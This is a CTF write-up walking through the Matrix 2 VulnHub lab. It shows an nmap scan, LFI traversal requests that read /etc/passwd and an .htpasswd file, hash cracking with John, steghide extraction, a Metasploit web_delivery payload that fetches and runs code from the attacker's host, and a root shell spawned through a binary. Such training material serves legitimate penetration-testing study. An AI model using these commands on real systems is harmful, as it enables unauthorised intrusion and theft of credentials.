<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Matrix 2: Vulnhub Lab Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/matrix-2-vulnhub-lab-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-01T12:30:09+00:00">March 1, 2019</time><time class="updated" datetime="2025-06-10T20:11:51+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another Boot2Root challenge “Matrix 2”. It is another vulnerable lab presented by vulnhub for helping pentester’s to perform penetration testing according to their experience level. This vulnerable lab can be downloaded from <a href="https://www.vulnhub.com/entry/matrix-2,279/">here</a>.<br/>
</span></p>
<p><span style="color: #000000;"><strong>Difficulty</strong>: Intermediate</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodologies:</strong></span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTP service port (80)</span></li>
<li><span style="color: #000000;">Surfing HTTPS service port (1337)</span></li>
<li><span style="color: #000000;">Surfing HTTPS service port (12320)</span></li>
<li><span style="color: #000000;">Surfing HTTPS service port (12322)</span></li>
<li><span style="color: #000000;">Browsing Directories on the browser</span></li>
<li><span style="color: #000000;">Discovering LFI vulnerability.</span></li>
<li><span style="color: #000000;">Enumerating through /etc/passwd file.</span></li>
<li><span style="color: #000000;">Enumerating through /var/www/p4ss/.htapasswd file.</span></li>
<li><span style="color: #000000;">Cracking password hash.</span></li>
<li><span style="color: #000000;">Using Credentials to log into port 1337.</span></li>
<li><span style="color: #000000;">Viewing Page source of Webpage.</span></li>
<li><span style="color: #000000;">Find Hidden file using steghide.</span></li>
<li><span style="color: #000000;">Using Credentials to log into port 12320.</span></li>
<li><span style="color: #000000;">Creating Python exploit using Metasploit.</span></li>
<li><span style="color: #000000;">Getting root access.</span></li>
<li><span style="color: #000000;">Snagging the Root flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.101</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-o_YjO6RDE6k/XHfQN9GKQwI/AAAAAAAAdIQ/1f_vFXGF6SwPMu9QlNH5IcfB2mY0KgSGwCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">From nmap result, we observed that on multiple ports there is HTTPS service running except on port 80. We thought of exploring all the ports along with targets IP Address on the browser. </span>Let’s<span style="color: #000000;"> see what clue we get to move ahead.</span></p>
<p><span style="color: #000000;"><strong>Firstly</strong>, we explored the Targets IP address on port <strong>80</strong> on the browser. It was not much of great help.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-LlQjewYvyuk/XHfQRt-lSXI/AAAAAAAAdJA/FaNSAJMBt-shudjRVnaI0nFNazUV_aSswCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;"><strong>Secondly</strong>, we explored the Targets IP Address on port <strong>1337</strong> on the browser. Here we noticed it required authentication but we </span>don’t<span style="color: #000000;"> know that. Moving on.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KYLe2p4jSQs/XHfQRwBCeOI/AAAAAAAAdJI/wwwpEF2FLpECWAylzjDg-6xZFooXmpFPgCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;"><strong>Thirdly</strong>, we explored the Targets IP Address over port <strong>12320</strong> on the browser. We noticed that it showed us a command shell which again is not much of </span>great<span style="color: #000000;"> help. Moving Forward.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-MXqklLMe4O8/XHfQSQ7ieVI/AAAAAAAAdJM/mSf3E2hig3Ia6ek9hwKMRr2xkYRuHkVfwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;"><strong>Fourthly</strong>, we explored the Targets IP Address over port <strong>12322 </strong>on the browser. The webpage opened </span>didn’t<span style="color: #000000;"> come out to be much useful. But what </span>draws<span style="color: #000000;"> our attention is that we noticed two disallowed entry on port <strong>12322</strong> in the </span>nmap<span style="color: #000000;"> scan result. On exploring the first entry <strong>robots.txt</strong>, we found another disallowed entry i.e <strong>file_view.php.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WH-z0weAsU8/XHfQSm4970I/AAAAAAAAdJU/rxPPxRKNVFQxP1hJ44Mf0c92TmihL-gDQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">When we explored the entry <strong>file_view.php</strong> along with <strong>Targets IP Address</strong>, it opened a blank webpage which made us curious about it. So, when we checked the <strong>View Page Source</strong>, there we saw the page is sending a <strong>GET Request</strong>. After spending some time thinking, we decided to use curl for exploiting LFI vulnerability for obtaining /etc/passwd file. Here we saw two credentials <strong>n30</strong> and <strong>Neo</strong>, they might come in handy.</span></p>
<pre class="lang:default decode:true">curl -X POST –k https://192.168.1.101:12322/file_view.php -d "file=../../../../../etc/passwd"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-IMFwH5y4TSY/XHfQTOaxNbI/AAAAAAAAdJY/0rfPom298UYobrNF4n2rhyZC3xZ7-u9MwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Here, we found another directory <strong>/var/www/p4ss/.htpasswd </strong>which might be useful.</span></p>
<pre class="lang:default decode:true">curl -X POST -k https://192.168.1.101:12322/file_view.php -d "file=../../../../../etc/nginx/sites-available/default"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vxKc14RlURQ/XHfQTqJPOBI/AAAAAAAAdJc/Dv6mM7k5PloS5INxgnYlM6bCAfvTXqC5wCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">After getting another directory, We used curl to exploit LFI vulnerability to obtain the contents of /var/www/p4ss/.htapasswd by using </span>the command<span style="color: #000000;">.</span></p>
<pre class="lang:default decode:true">curl –X POST –k https://192.168.1.101:12322/file_view.php -d "file=../../../../../var/www/p4ss/.htapasswd"</pre>
<p><span style="color: #000000;">This result gave us a HASH. Time to bring john up.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LqhE0_p26yo/XHfQNydxYeI/AAAAAAAAdIU/WXuAYZKaLtU0pCgjrgKXFragK6da5mCogCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We have used </span>John<span style="color: #000000;"> to crack the hash.</span></p>
<pre class="lang:default decode:true">john hash --wordlist=/usr/share/wordlists/rockyou.txt</pre>
<p><span style="color: #000000;">It gave us a Username and Password i.e<strong> admin &amp; Tr1n17y</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vNCwIB_Vzak/XHfQNxswfzI/AAAAAAAAdIY/WUhE1k6_KecNaQ80uExrOxAYE55x4yEoACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Let’s use these credentials to log into port 1337 along with Targets IP Address on the browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-G5fU8xmppWI/XHfQOtW6wJI/AAAAAAAAdIc/qdNO2B2fqo4jzv30UWd-v-PJRqEmC7zIQCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">The webpage showed a name <strong>n30</strong> which can be used as a <strong>credential</strong> later on. On exploring the <strong>View Page Source</strong> of the webpage showed us a hidden image <strong>h1dd3n.jpg.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HWqZFSNWOtE/XHfQPZUCjoI/AAAAAAAAdIk/yDVWXm82yr0wz-7ttIPtsAzivQXyvyVqQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">When opening the image <strong>h1dd3n.jpg</strong> on the browser. The result is shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-OQIXNuZp5oU/XHfQPzxD9eI/AAAAAAAAdIs/IQet9x_4aHk7AKdClnumcJdimReaEGW1gCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We have used a tool called “<strong>steghide</strong>” to find if there is any file hidden inside the image and find a hidden text file called <strong>“n30.txt”.</strong> We extract the file and opened it which gave us a password i.e <strong>P4$$w0rd</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Xa2fp_1Ln6E/XHfQPxs8hVI/AAAAAAAAdIo/-qoK2E529ZEwgCHgSuH0qAZLBQtjQbYIgCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Let’s </span>login<span style="color: #000000;"> to port <strong>12320</strong> using targets IP Address by using Credentials as.</span></p>
<pre class="lang:default decode:true">Username: n30
Password: P4$$w0rd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8ZbnQTpH898/XHfQQFQLQjI/AAAAAAAAdIw/WCLVhYq-KDcJDkdZuQHQNfzfJaimMHiwgCLcBGAs/s1600/17.1.png"/></span></p>
<p><span style="color: #000000;">After making sure python is running on the machine. We have created a python exploit using Metasploit.</span></p>
<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
set lhost 192.168.1.107
set srvhost 192.168.1.107
exploit</pre>
<p><span style="color: #000000;">Let’s copy the command created and paste it on the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-v5RTNx0V4v8/XHfQQoM6n4I/AAAAAAAAdI0/twjg6ZpfWsEJhnq74OF4QC6EmSF-35EGQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Let’s copy the command created and paste it on the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-67MgWeeF4uI/XHfQQyASoSI/AAAAAAAAdI4/6QtFkjCV_ZsRK6AA_vPkqCFXHeh-ZSE9gCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">After obtaining meterpreter, we have explored the directories. Here we found a file <strong>.bash_history </strong>which contains some commands. These commands can be useful to get root access, </span>let’s<span style="color: #000000;"> save them for later use.</span></p>
<pre class="lang:default decode:true">ls
cat .bash_histroy</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zW-5dtNW7T8/XHfQRCfJnAI/AAAAAAAAdI8/EwVRa_2itJofugb9_bK2NCPy3vQ3OmjNwCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Let’s get back to the meterpreter and use the command we have obtained earlier.</span></p>
<p>Booyah<span style="color: #000000;">!! We have got the root access. Time to read the flag.</span></p>
<pre class="lang:default decode:true">shell
id
morpheus 'BEGIN {system("/bin/sh")}'
id
cd /root
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-aPBcIyjs04U/XHfQR8YEwBI/AAAAAAAAdJE/F0FvYpcOI20PixY2S5n5IM3uYBjxICxVACLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
